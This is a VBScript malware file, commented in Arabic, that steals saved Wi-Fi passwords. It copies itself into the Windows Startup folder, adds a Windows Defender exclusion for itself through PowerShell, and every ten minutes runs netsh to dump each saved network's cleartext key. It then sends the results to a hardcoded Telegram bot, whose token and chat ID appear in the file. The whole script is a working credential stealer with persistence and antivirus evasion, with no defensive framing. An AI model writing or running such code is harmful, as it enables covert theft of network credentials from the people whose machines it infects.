Dim objShell, objExec, objHTTP
Dim wifiProfiles, profile, command, result, message, keyContent
Dim botToken, chatID, apiURL
Dim startupFolder, scriptPath

' بيانات بوت تيليجرام
botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc"  
chatID = "5792222595"
apiURL = "https://api.telegram.org/bot" & botToken & "/sendMessage"

Set objShell = CreateObject("WScript.Shell")

' إضافة السكربت إلى بدء التشغيل
startupFolder = objShell.SpecialFolders("Startup")
scriptPath = WScript.ScriptFullName
If Not FileExists(startupFolder & "\" & WScript.ScriptName) Then
    objShell.Run "cmd /c copy """ & scriptPath & """ """ & startupFolder & "\"""", 0, False
End If

' إضافة استثناء في ويندوز ديفيندر
On Error Resume Next
objShell.Run "powershell -Command Add-MpPreference -ExclusionPath """ & scriptPath & """", 0, False
If Err.Number <> 0 Then
    ' إدارة الخطأ إذا فشل الأمر
    WScript.Echo "Failed to add exclusion to Windows Defender."
    Err.Clear
End If
On Error GoTo 0

' تشغيل السكربت في الخلفية
Do While True
    ' تشغيل الأمر للحصول على جميع الشبكات المحفوظة
    Set objExec = objShell.Exec("cmd /c netsh wlan show profiles")
    wifiProfiles = objExec.StdOut.ReadAll()

    ' استخراج أسماء الشبكات المحفوظة
    message = "🔍 Wi-Fi Credentials Dump 🔍" & vbCrLf & vbCrLf
    For Each profile In Split(wifiProfiles, vbCrLf)
        If InStr(profile, "All User Profile") > 0 Then
            profile = Trim(Split(profile, ":")(1))

            ' تشغيل الأمر للحصول على تفاصيل الشبكة وكلمة المرور
            command = "cmd /c netsh wlan show profile name=""" & profile & """ key=clear"
            Set objExec = objShell.Exec(command)
            result = objExec.StdOut.ReadAll()
            
            ' استخراج كلمة المرور
            If InStr(result, "Key Content") > 0 Then
                keyContent = Trim(Split(Split(result, "Key Content")(1), ":")(1))
            Else
                keyContent = "N/A"
            End If
            
            ' إضافة البيانات إلى الرسالة
            message = message & "📡 *Network:* `" & profile & "`" & vbCrLf
            message = message & "🔑 *Password:* `" & keyContent & "`" & vbCrLf
            message = message & "------------------------------" & vbCrLf
        End If
    Next

    ' إرسال البيانات إلى تيليجرام
    On Error Resume Next
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "POST", apiURL, False
    objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    objHTTP.Send "chat_id=" & chatID & "&text=" & EncodeURIComponent(message) & "&parse_mode=Markdown"
    If Err.Number <> 0 Then
        ' إدارة الخطأ إذا فشل الإرسال
        WScript.Echo "Failed to send message to Telegram."
        Err.Clear
    End If
    On Error GoTo 0

    ' تنظيف المتغيرات
    Set objExec = Nothing
    Set objHTTP = Nothing

    ' الانتظار لمدة 10 دقائق قبل التنفيذ التالي
    WScript.Sleep 600000
Loop

' دالة للتحقق من وجود الملف
Function FileExists(filePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    FileExists = fso.FileExists(filePath)
    Set fso = Nothing
End Function

' دالة لتشفير النص (URL Encoding)
Function EncodeURIComponent(text)
    Dim encodedText
    encodedText = ""
    Dim i, char
    For i = 1 To Len(text)
        char = Mid(text, i, 1)
        If char Like "[A-Za-z0-9-_.!~*'()]" Then
            encodedText = encodedText & char
        Else
            encodedText = encodedText & "%" & Hex(Asc(char))
        End If
    Next
    EncodeURIComponent = encodedText
End Function